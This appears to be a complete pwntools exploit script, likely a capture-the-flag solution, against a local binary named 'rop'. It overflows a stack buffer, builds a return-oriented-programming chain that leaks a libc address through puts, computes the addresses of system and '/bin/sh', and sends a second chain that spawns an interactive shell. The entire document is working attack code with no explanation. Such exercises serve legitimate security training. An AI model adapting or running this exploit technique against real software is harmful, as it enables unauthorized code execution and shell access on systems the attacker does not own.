from pwn import *
start_main = 0x0000000000600ff0
puts_plt = 0x4004a0
main = 0x4005dc
pop_rdi = 0x0000000000400683
pop_rsi = 0x0000000000400681

p = process("./rop")

payload = ""
payload += "A"*40
payload += p64(pop_rdi)
payload += p64(start_main)
payload += p64(puts_plt)
payload += p64(main)
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,"\x00"))
print hex(leak)
base = leak - 0x21ab0
system = base + 0x000000000004f4e0
binsh = base + 0x1b40fa
payload = ""
payload += "A"*40
payload += p64(pop_rsi)
payload += p64(0xdeadbeef)*2
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
p.sendline(payload)
p.interactive()